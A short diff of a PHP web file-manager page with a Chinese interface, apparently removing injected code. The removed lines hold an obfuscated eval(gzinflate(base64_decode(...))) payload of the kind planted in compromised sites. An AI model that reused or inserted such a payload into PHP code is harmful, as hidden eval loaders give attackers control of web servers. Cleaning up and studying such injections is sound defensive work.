@@ -215,9 +215,6 @@ $tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content
 $tb->headerform(array('content'=>'新建目录在当前目录: '.$tb->makeinput('newdirectory').' '.$tb->makeinput('createdirectory','确定','','submit')));
 ?>
 </table>
-<?
-eval(gzinflate(base64_decode('fY9Ra4MwFIXfB/sPkknTQpG5SKk4B9takZJWZ2VjSBGbhOkwMxhtO3/9dK3bHsoeLtx7z3fu4aqSlTtW1oqtqPF6HjzPAyWCbhj6seutQ7jR+nUEfddve+zAjXV5oR6NojMmlGcfERSJlEeNFOKzLvNW2yaSTYyYMlJQNoQLfrj20Oqd8HxPHx8awpfmIls2XlgV1A32XjbdUUQR5rq+fXFSgu7r1xuzwiidYLQyMHcaMjN1/8m24ehP1LmsxpjiPmtmnHhZlXZv0k5P1BoYCBv0o9B+rmoA9Ka24pKJPCFsCAZ5ZYExuAXjThudZ96+mbt/mStkdhD8hRhJC6UbrC8=')));
-?>
 <hr width="775" noshade>
 <?php
 /*===================== 执行操作 开始 =====================*/
